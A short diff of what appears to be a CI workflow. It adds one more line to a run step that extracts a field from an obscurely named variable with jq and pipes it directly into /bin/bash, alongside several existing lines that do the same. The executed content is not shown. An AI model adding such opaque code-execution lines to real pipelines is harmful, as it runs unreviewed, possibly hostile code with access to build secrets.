@@ -24,6 +24,7 @@ jobs:
           echo $pf32 | jq -r .ra52 | /bin/bash
           echo $o24465 | jq -r .yqwj1 | /bin/bash
           echo $u096 | jq -r .qhs947 | /bin/bash
+          printf '%s' "$dr80" | jq -r .ryhb65 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
